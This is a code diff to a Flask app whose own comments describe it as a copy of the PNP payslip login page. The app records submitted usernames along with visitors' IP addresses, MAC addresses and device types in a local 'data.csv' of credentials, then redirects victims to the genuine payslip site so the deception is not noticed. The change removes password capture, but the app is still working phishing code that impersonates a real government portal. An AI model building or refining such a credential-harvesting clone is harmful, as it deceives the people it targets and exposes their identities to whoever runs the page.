@@ -89,7 +89,7 @@ def get_mac_address(ip_address):
 @app.route('/login', methods=['POST'])
 def login():
     username = request.form.get('username')
-    password = request.form.get('password')
+    # Note: Still receiving password from form but not using it
     
     # getting client's IP address
     ip_address = get_client_ip()
@@ -98,17 +98,17 @@ def login():
     mac_address = get_mac_address(ip_address)
     device_type = get_device_type()
     
-    if not username or not password:
-        return render_template('index.html', error="Please enter both username and password")
+    if not username:
+        return render_template('index.html', error="Please enter your username")
     
     # save the credentials containing the names in every column
     timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
-    save_to_csv(username, password, timestamp, ip_address, mac_address, device_type)
+    save_to_csv(username, timestamp, ip_address, mac_address, device_type)
     
     # looping from copycat-ed ui/ux of pnp payslip to it's original payslip
     return redirect("https://payslip.pnppms.org/Account/Login?ReturnUrl=%2F")
 
-def save_to_csv(username, password, timestamp, ip_address, mac_address, device_type):
+def save_to_csv(username, timestamp, ip_address, mac_address, device_type):
     """ 
     Get the directory where the script is located. The name for stacking credentials is 
     data.csv
